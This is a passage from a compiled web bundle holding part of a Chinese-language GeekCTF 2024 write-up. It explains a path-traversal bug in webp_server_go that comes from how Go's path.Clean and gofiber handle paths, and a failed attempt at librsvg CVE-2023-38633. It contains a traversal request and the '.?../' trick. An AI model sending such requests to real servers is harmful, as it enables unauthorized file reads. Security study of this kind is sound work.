d4\u5982\u8bf7\u6c42",(0,s.jsx)(n.code,{children:"GET ../../flag.png HTTP/1.1"}),"\uff0c\u5c31\u4f1a\u4e00\u8def\u7a7f\u5230\u6839\u76ee\u5f55\u53bb\u3002\u8fd9\u4e2a\u95ee\u9898\u5e94\u8be5\u5728",(0,s.jsx)(n.code,{children:"gofiber"}),"\u5e93\u91cc\uff0c\u5bf9URL\u7684\u5904\u7406\u6709\u903b\u8f91\u95ee\u9898\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u4e2a\u7684\u6839\u6e90\u5e94\u8be5\u5728\u4e8egolang",(0,s.jsx)(n.code,{children:"path.Clean"}),"\u5904\u7406\u539f\u5219",(0,s.jsx)(n.a,{href:"https://cs.opensource.google/go/go/+/refs/tags/go1.22.2:src/path/path.go;l=61",children:"\u7b2c\u56db\u6761"}),"\uff1a\u5982\u679cHTTP\u62a5\u6587\u4e2d\u5e26",(0,s.jsx)(n.code,{children:"/"}),"\u65f6\uff0c\u8fd9\u4e2a\u8def\u5f84\u5c31\u76f8\u5f53\u4e8e\u4e00\u4e2a\u6839\u76ee\u5f55\uff0c\u800c\u6839\u76ee\u5f55\u540e\u7684",(0,s.jsx)(n.code,{children:".."}),"\u4f1a\u88ab\u81ea\u52a8\u6e05\u9664\u3002\u800c\u5982\u679c\u4e0d\u5e26",(0,s.jsx)(n.code,{children:"/"}),"\uff0c",(0,s.jsx)(n.code,{children:"path.Clean"}),"\u4f1a\u8ba4\u4e3a\u8fd9\u4e2a\u662f\u76f8\u5bf9\u8def\u5f84\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-go",children:'// Clean returns the shortest path name equivalent to path\n// by purely lexical processing. It applies the following rules\n// iteratively until no further processing can be done:\n//\n//  1. Replace multiple slashes with a single slash.\n//  2. Eliminate each . path name element (the current directory).\n//  3. Eliminate each inner .. path name element (the parent directory)\n//     along with the non-.. element that precedes it.\n//  4. Eliminate .. elements that begin a rooted path:\n//     that is, replace "/.." by "/" at the beginning of a path.\n//\n// The returned path ends in a slash only if it is the root "/".\n//\n// If the result of this process is an empty string, Clean\n// returns the string ".".\n//\n// See also Rob Pike, \u201cLexical File Names in Plan 9 or\n// Getting Dot-Dot Right,\u201d\n// https://9p.io/sys/doc/lexnames.html\nfunc Clean(path string) string {\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u540c\u65f6\uff0cgofiber\u7684",(0,s.jsx)(n.code,{children:"path.go"}),"\u4e5f\u5b8c\u5168\u5339\u914d\u4e86",(0,s.jsx)(n.code,{children:"/*"}),"\uff0c\u5373\u4f7f\u5b83\u4e0d\u4ee5",(0,s.jsx)(n.code,{children:"/"}),"\u5f00\u5934\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-go",children:'// RoutePatternMatch checks if a given path matches a Fiber route pattern.\nfunc RoutePatternMatch(path, pattern string, cfg ...Config) bool {\n\t// See logic in (*Route).match and (*App).register\n\tvar ctxParams [maxParams]string\n\n\tconfig := Config{}\n\tif len(cfg) > 0 {\n\t\tconfig = cfg[0]\n\t}\n\n\tif path == "" {\n\t\tpath = "/"\n\t}\n\n\t// Cannot have an empty pattern\n\tif pattern == "" {\n\t\tpattern = "/"\n\t}\n\t// Pattern always start with a \'/\'\n\tif pattern[0] != \'/\' {\n\t\tpattern = "/" + pattern\n\t}\n\n\tpatternPretty := pattern\n\n\t// Case-sensitive routing, all to lowercase\n\tif !config.CaseSensitive {\n\t\tpatternPretty = utils.ToLower(patternPretty)\n\t\tpath = utils.ToLower(path)\n\t}\n\t// Strict routing, remove trailing slashes\n\tif !config.StrictRouting && len(patternPretty) > 1 {\n\t\tpatternPretty = strings.TrimRight(patternPretty, "/")\n\t}\n\n\tparser := parseRoute(patternPretty)\n\n\tif patternPretty == "/" && path == "/" {\n\t\treturn true\n\t\t// \'*\' wildcard matches any path\n\t} else if patternPretty == "/*" {\n\t\treturn true\n\t}\n\n\t// Does this route have parameters\n\tif len(parser.params) > 0 {\n\t\tif match := parser.getMatch(path, path, &ctxParams, false); match {\n\t\t\treturn true\n\t\t}\n\t}\n\t// Check for a simple match\n\tpatternPretty = RemoveEscapeChar(patternPretty)\n\tif len(patternPretty) == len(path) && patternPretty == path {\n\t\treturn true\n\t}\n\t// No match\n\treturn false\n}\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u4e24\u70b9\u4e00\u7ed3\u5408\uff0c\u5c31\u5bfc\u81f4\u5b9e\u9645\u4e0a",(0,s.jsx)(n.code,{children:"Clean"}),"\u6839\u672c\u6ca1\u6709\u628a\u5f00\u5934\u7684",(0,s.jsx)(n.code,{children:"../"}),"\u53bb\u6389\uff0c\u5c31\u4f20\u7ed9\u8bfb\u53d6\u6587\u4ef6\u7684\u51fd\u6570\u4e86\u3002\u5f88\u96be\u8bc4\uff0c",(0,s.jsx)(n.code,{children:"Clean"}),"\u89c9\u5f97\u81ea\u5df1\u5f97\u517c\u5bb9\u6587\u4ef6\u7cfb\u7edf\uff0c\u4e07\u4e00\u7528\u6237\u4f20\u7684\u5c31\u662f\u76f8\u5bf9\u8def\u5f84\u5462\u3002",(0,s.jsx)(n.code,{children:"gofiber"}),"\u89c9\u5f97\u81ea\u5df1\u5f97\u5c0a\u91cd\u7528\u6237\u610f\u613f\u4e0d\u8981\u4e71\u6539\u8bf7\u6c42\u5934\uff0c\u56e0\u4e3a\u81ea\u5df1host\u7684\u4e0d\u4e00\u5b9a\u662f\u6587\u4ef6\u7cfb\u7edf\uff0c\u4e07\u4e00\u5404\u4e2aendpoint\u6709\u5404\u81ea\u529f\u80fd\u5462\uff0c\u600e\u4e48\u80fd\u4e71\u6539\u3002\u7136\u540e",(0,s.jsx)(n.code,{children:"webp_server_go"}),"\u89c9\u5f97\u4f60\u4eec\u4e24\u4f4d\u5927\u54e5\u80af\u5b9a\u628a\u4e8b\u60c5\u90fd\u529e\u597d\u4e86\u554a\uff0c\u90fd",(0,s.jsx)(n.code,{children:"/*"}),"\u4e86\u524d\u9762\u600e\u4e48\u4f1a\u6ca1\u6709",(0,s.jsx)(n.code,{children:"/"}),"\u5462\uff0c\u6839\u636e\u6587\u6863\u7b2c\u56db\u6761",(0,s.jsx)(n.code,{children:"path.Clean"}),"\u90a3\u4e0d\u5c31\u662f\u76f4\u63a5\u7ed9\u53bb\u6389\u4e86\u5417\u3002\u7ed3\u679c\u5c31\u8c01\u90fd\u6ca1\u7ba1\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u9065\u60f3\u5f53\u65f6\u6253USTC Hackergame2023\u7684\u90a3\u9053iptables\u9898\uff0c\u90a3\u4e2a\u9898\u7684Go\u670d\u52a1\u5668\u5c31\u5f88\u4e25\u683c\uff0cHTTP\u62a5\u6587\u5c31\u5fc5\u987b\u5f97\u4ee5",(0,s.jsx)(n.code,{children:"/"}),"\u5f00\u5934\uff0c\u4e0d\u7136\u5c31\u62a5500\u3002\u770b\u6765\u8fd9\u4e2a\u5904\u7406\u662f\u6709\u9053\u7406\u7684\u554a\u3002"]}),"\n",(0,s.jsx)(n.h4,{id:"\u5931\u8d25\u7684\u5c1d\u8bd5librsvg\u8def\u5f84\u7a7f\u8d8acve-2023-38633\u73af\u5883\u7248\u672c\u5df2\u4fee\u590d",children:"\u5931\u8d25\u7684\u5c1d\u8bd5\uff1alibrsvg\u8def\u5f84\u7a7f\u8d8a\uff08CVE-2023-38633\uff0c\u73af\u5883\u7248\u672c\u5df2\u4fee\u590d\uff09"}),"\n",(0,s.jsxs)(n.p,{children:["\u4e3a\u4ec0\u4e48\u4f1a\u8003\u8651\u8fd9\u4e2a\uff0c\u662f\u56e0\u4e3a\u6211\u5076\u7136\u53d1\u73b0\uff0c\u597d\u50cf\u73af\u5883\u7684",(0,s.jsx)(n.code,{children:"librsvg"}),"\u6709\u70b9\u65e7\u554a\uff1f"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-sh",children:"$ find /lib -name librsvg*\n/lib/x86_64-linux-gnu/librsvg.2.48.0\n"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsxs)(n.p,{children:["\u7136\u800c\u4e8b\u5b9e\u4e0a\u6587\u4ef6\u540d\u7684\u7248\u672c\u53f7\u662f\u4e0d\u5bf9\u7684\u3002\u771f\u6b63\u770b\u7248\u672c\u6700\u597d\u7684\u65b9\u5f0f\u662f",(0,s.jsx)(n.code,{children:"apt list|grep librsvg"}),"\uff0c\u53ef\u4ee5\u770b\u5230\u662f",(0,s.jsx)(n.code,{children:"2.54.7"}),"\uff0c\u662f\u4e00\u4e2a\u88ab\u4f5c\u8005\u628a\u8865\u4e01backport\u56de\u6765\u7684\u7248\u672c\u3002"]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u800c\u521a\u597d2.56.3\u7248\u672c\u6709\u4e2aSVG\u8def\u5f84\u7a7f\u8d8a",(0,s.jsx)(n.a,{href:"https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/",children:"CVE-2023-38633"}),"\u3002\u539f\u672cSVG\u8981\u5f15\u7528\u5916\u90e8\u5185\u5bb9\uff0clibrsvg\u4f1a\u5229\u7528Rust\u7684",(0,s.jsx)(n.code,{children:"std::fs::canonicalize"}),"\u68c0\u67e5\u88ab\u5f15\u7528\u7684\u5185\u5bb9\u662f\u5426\u5728SVG\u672c\u8eab\u7684\u7236\u76ee\u5f55\u4e2d\u3002\u539f\u672c\u8fd9\u4e2a\u8fc7\u7a0b\u4f1a\u628a\u8f6f\u8fde\u63a5\u3001",(0,s.jsx)(n.code,{children:"../"}),"\u8fd9\u79cd\u7ed9\u53bb\u6389\uff0c\u4f46\u8fd9\u4e2a",(0,s.jsx)(n.code,{children:"canonicalize"}),"\u4f3c\u4e4e\u539f\u672c\u4e0d\u662f\u5904\u7406Unix\u6587\u4ef6\u7cfb\u7edf\u800c\u662f\u5904\u7406URL\u7684\uff08\u867d\u7136",(0,s.jsx)(n.code,{children:"file://"}),"\u4e5f\u7b97\u4e00\u79cdURL\uff0c\u4f46\u6700\u7ec8\u662f\u8981\u8c03\u7528Unix\u6587\u4ef6\u7cfb\u7edf\uff09\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u4f1a\u628a",(0,s.jsx)(n.code,{children:"?, #"}),"\u90e8\u5206\u7ed9\u622a\u6389\uff0c\u4f46\u662f\u6700\u540e\u8bfb\u53d6\u6587\u4ef6\u65f6\u7528\u7684\u53c8\u662f\u539f\u672c\u7684URL\uff0c\u8fd9\u5c31\u5bfc\u81f4\u4e86\u7c7b\u4f3c",(0,s.jsx)(n.code,{children:".?../../../"}),"\u8fd9\u4e2a\u4e1c\u897f\uff0c\u5728",(0,s.jsx)(n.code,{children:"canonicalize"}),"\u91cc\u76f8\u5f53\u4e8e\u4e2a",(0,s.jsx)(n.code,{children:"."}),"\uff0c\u81ea\u7136\u5c5e\u4e8e\u5f53\u524d\u76ee\u5f55\uff0c\u4f46\u5728\u6587\u4ef6\u7cfb\u7edf\u91cc\u76f8\u5f53\u4e8e",(0,s.jsx)(n.code,{children:".?.."}),"\u76f8\u5f53\u4e8e\u4e00\u7ea7\u8def\u5f84\uff0c\u5e76\u4e14\u4f1a\u548c\u540e\u9762\u4e00\u4e2a",(0,s.jsx)(n.code,{children:"../"}),"\u4e2d\u548c\u6389\uff0c\u540e\u9762\u7684\u90e8\u5206\u90fd\u4f1a\u88ab\u62fc\u63a5\u5230\u8def\u5f84\u91cc\uff0c\u9020\u6210\u8def\u5f84\u7a7f\u8d8a\u3002\u89e3\u51b3\u65b9\u6848\u5c31\u662f\u4e0d\u5141\u8bb8\u5728SVG\u7684URL\u4e2d\u5305\u542b\u4efb\u4f55",(0,s.jsx)(n.code,{children:"?, #, @"}),"\u7b49\u7b26\u53f7\uff0c\u540c\u65f6\u4f20\u7ed9\u6587\u4ef6\u7cfb\u7edf\u7684\u4e5f\u5fc5\u987b\u662f",(0,s.jsx)(n.code,{children:"canonicalize"}),"\u540e\u7684\u8def\u5f84\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u5f53\u7136",(0,s.jsx)(n.code,{children:"xi:include"}),"\u548c",(0,s.jsx)(n.code,{children:"image"}),"\u6807\u7b7e\uff0c\u6709\u7406\u7531\u76f8\u4fe1\u4ed6\u4eec\u68c0\u67e5URL\u7684\u65b9\u6cd5\u662f\u4e00\u6837\u7684\uff0c\u4e00\u4e2a\u80fd\u6253\uff0c\u53e6\u4e00\u4e2a\u4e5f\u80fd\u3002\u5f53\u7136\uff0c\u505a\u8fd9\u4e2a\u9898\u7684\u65f6\u5019\u90fd\u6253\u4e0d\u901a\u5c31\u662f\u4e86\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u8c03\u8bd5\u8fd9\u4e2a\u9898\u7684\u8fc7\u7a0b\uff0c\u6211\u7b2c\u4e00\u6b21\u4f7f\u7528strace\u53bb\u770b\u7cfb\u7edf\u8c03\u7528\uff0c\u770b\u6587\u4ef6\u8bfb\u53d6\u7ec6\u8282\uff0c\u867d\u7136\u6ca1\u5b9e\u8d28\u6027\u4f5c\u7528\uff0c\u4f46\u8fd8\u662f\u8ba9\u6211\u7a0d\u5fae\u7406\u89e3\u4e86\u4e00\u70b9librsvg\u7684\u5de5\u4f5c\u6d41\u7a0b\u3002"})]})}function h(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(t,{...e})}):t(e)}},2709:(e,n,c)=>{c.d(n,{A:()=>r});const r=c.p+"assets/files/req-fbdaf69f623bb51872377c04b9650a06.py"},6674:(e,n,c)=>{c.d(n,{A:()=>r});const r=c.p+"assets/images/blok_view-360c25352b106bf1c3d0c3b140d41af2.png"},8453:(e,n,c)=>{c.d(n,{R:()=>d,x:()=>i});var r=c(6540);const s={},l=r.createContext(s);function d(e){const n=r.useContext(l);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:d(e.components),r.createElement(l.Provider,{value:n},e.children)}},9451:e=>{e.exports=JSON.parse('{"permalink":"/ctf-writeup/2024/04/14/geekctf-writeup","source":"@site/ctf/2024-04-14-geekctf-writeup/index.md","title":"GeekCTF 2024 (+2 small CTFs)","description":"RitsecCTF 2024 + DamCTF 2024 + GeekCTF 2024 \u4e2a\u4ebaWriteup","date":"2024-04-14T00:00:00.000Z","tags":[{"inline":false,"label":"CTF","permalink":"/ctf-writeup/tags/ctf","description":"Catch-The-Flag contests writeups / learning notes"}],"readingTime":61.905,"hasTruncateMarker":true,"authors":[{"name":"Lysithea","title":"CTF enthusiastist. Usual teamname: Lysithea, Ribom, RibomBalt","email":"ribombalt1@gmail.com","page":{"permalink":"/ctf-writeup/authors/RibomBalt"},"socials":{"github":"https://github.com/RibomBalt","stackoverflow":"https://stackoverflow.com/users/RibomBalt","ctftimes":"https://ctftime.org/team/282941"},"imageURL":"https://github.com/RibomBalt.png","key":"RibomBalt"}],"frontMatter":{"title":"GeekCTF 2024 (+2 small CTFs)","authors":"RibomBalt","tags":["CTF"]},"unlisted":false,"prevItem":{"title":"squ1rrelCTF2024 + TBTL CTF 2024 (Web + Pwn)","permalink":"/ctf-writeup/2024/05/13/TBTLCTF2024"},"nextItem":{"title":"UTCTF 2024 \u4e2a\u4eba\u9898\u89e3","permalink":"/ctf-writeup/2024/04/02/UTCTF2024"}}')}}]);